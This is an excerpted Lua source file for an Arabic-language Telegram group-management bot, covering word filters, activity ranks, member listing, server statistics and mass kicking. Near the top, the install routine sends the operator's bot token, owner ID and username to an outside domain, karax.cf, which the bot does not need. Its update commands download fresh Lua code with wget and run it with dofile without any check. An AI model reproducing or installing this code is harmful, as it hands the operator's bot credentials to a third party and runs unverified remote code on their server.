...
https.request('http://karax.cf/COWCOWLYUS/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("COWCOWLYUS", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/COWCOWLYUS
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./COWCOWLYUS.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S COWCOWLYUS -X kill
screen -S COWCOWLYUS ./COWCOWLYUS
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/COWCOWLYUSTEAM/Files_COWCOWLYUS/master/File_Bot/commands.lua") 
...
local COWCOWLYUS_Msg = ''  
if msgs < 100 then 
COWCOWLYUS_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
COWCOWLYUS_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
COWCOWLYUS_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
COWCOWLYUS_Msg = 'متفاعل' 
elseif msgs < 1200 then 
COWCOWLYUS_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
COWCOWLYUS_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
COWCOWLYUS_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
COWCOWLYUS_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
COWCOWLYUS_Msg = 'قمة التفاعل' 
elseif msgs < 5500 then 
COWCOWLYUS_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
COWCOWLYUS_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
COWCOWLYUS_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
COWCOWLYUS_Msg = 'رب التفاعل'  
end 
return COWCOWLYUS_Msg 
end
function GetFile_Bot(msg)
local list = database:smembers(bot_id..'Chek:Groups') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'COWCOWLYUS Chat'
...
--------------------------------------------------------------------------------------------------------------
function SourceCOWCOWLYUS(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,COWCOWLYUS_Msg) 
return false  
end 
if text then    
...
if text == 'معلومات السيرفر 📊' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local COWCOWLYUS1 = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..COWCOWLYUS1.server.uptime_in_days..'('..COWCOWLYUS1.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..COWCOWLYUS1.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..COWCOWLYUS1.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..COWCOWLYUS1.stats.instantaneous_ops_per_sec..'`\n'
send(msg.chat_id_, msg.id_, text2)  
end


if text == 'تحديث السورس ™' and SudoBot(msg) then 
os.execute('rm -rf COWCOWLYUS.lua')
os.execute('wget https://raw.githubusercontent.com/FASAZTEAE/COWCOWLYUS/master/COWCOWLYUS.lua')
send(msg.chat_id_, msg.id_,'🔭| تم تحديث البوت \n📮| لديك اخر اصدار سورس كاولي\n📡| الاصدار ← { 1.2v}')
dofile('COWCOWLYUS.lua')  
end
...
local COWCOWLYUS = (w + q)
local sendok = #group - COWCOWLYUS
if q == 0 then
COWCOWLYUS = ''
else
...
send(msg.chat_id_, msg.id_,'📌| عدد المجموعات الان » { '..#group..' }'..COWCOWLYUSk..''..COWCOWLYUS..'\n*📌| الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
local COWCOWLYUS1_Msg = database:get(bot_id.."COWCOWLYUS1:Add:Filter:Rp2"..text..msg.chat_id_)   
if COWCOWLYUS1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if COWCOWLYUS_Msg and not Special(msg) then  
local COWCOWLYUS_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if COWCOWLYUS_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
os.execute('rm -rf COWCOWLYUS.lua')
os.execute('wget https://raw.githubusercontent.com/COWCOWLYUSTEAM/COWCOWLYUS/master/COWCOWLYUS.lua')
send(msg.chat_id_, msg.id_,'??| تم تحديث البوت \n📮| لديك اخر اصدار سورس كاولي\n📡| الاصدار ← { 1.2v}')
dofile('COWCOWLYUS.lua')  
end
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/COWCOWLYUSTEAM/Files_COWCOWLYUS/master/getfile.json")
if res == 200 then
...
database:set(bot_id.."COWCOWLYUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."COWCOWLYUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"🚸|ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."COWCOWLYUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."COWCOWLYUS1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."COWCOWLYUS1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."COWCOWLYUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"🔖|تم منع الكلمه مع التحذير")  
database:del(bot_id.."COWCOWLYUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."COWCOWLYUS1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."COWCOWLYUS1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."COWCOWLYUS1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"🔖|ارسل الكلمه الان")  
database:set(bot_id.."COWCOWLYUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."COWCOWLYUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."COWCOWLYUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."COWCOWLYUS1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."COWCOWLYUS1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."COWCOWLYUS1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."COWCOWLYUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."COWCOWLYUS1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."COWCOWLYUS1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n⛔|قائمة المنع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do  
local COWCOWLYUS_Msg = database:get(bot_id.."COWCOWLYUS1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..COWCOWLYUS_Msg.."}\n"    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'['..COWCOWLYUS_Msg[math.random(#COWCOWLYUS_Msg)]..']') 
return false
end
...
},function(ta,COWCOWLYUS)
local t = "\n🔘| قائمة الاعضاء \n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉\n"
x = 0
local list = COWCOWLYUS.members_
for k, v in pairs(list) do
x = x + 1
...
-- vardump(data) 
COWCOWLYUSdx(msg.chat_id_, msg.id_, '📤| ايدي المجموعة » ( '..msg.chat_id_..' )\n🚸| عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛| عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆| عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
COWCOWLYUS = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(COWCOWLYUS)
...
--------------------------------------------------------------------------------------------------------------
SourceCOWCOWLYUS(data.message_,data)
...
------------------------------------------------------------------------
local COWCOWLYUSAbot = database:get(bot_id.."COWCOWLYUS1:Add:Filter:Rp2"..text..result.chat_id_)   
if COWCOWLYUSAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫|["..COWCOWLYUSAbot.."] \n") 
else
...
------------------------------------------------------------------------
if text then
local COWCOWLYUS1_Msg = database:get(bot_id.."COWCOWLYUS1:Add:Filter:Rp2"..text..result.chat_id_)   
if COWCOWLYUS1_Msg then    
send(msg.chat_id_, msg.id_,"🔖|"..COWCOWLYUS1_Msg)
